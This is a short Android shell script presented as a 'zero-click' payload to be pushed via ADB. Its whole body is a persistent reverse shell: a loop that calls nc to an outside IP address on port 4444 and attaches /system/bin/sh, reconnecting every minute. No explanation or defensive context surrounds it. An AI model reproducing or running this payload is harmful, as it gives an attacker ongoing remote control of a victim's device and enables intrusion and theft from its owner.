#!/system/bin/sh
# Megalodon Zero-Click ADB Payload
# Executes automatically when pushed via ADB

# Set up reverse shell
while true; do
    nc 192.168.18.11 4444 -e /system/bin/sh &
    sleep 60
done
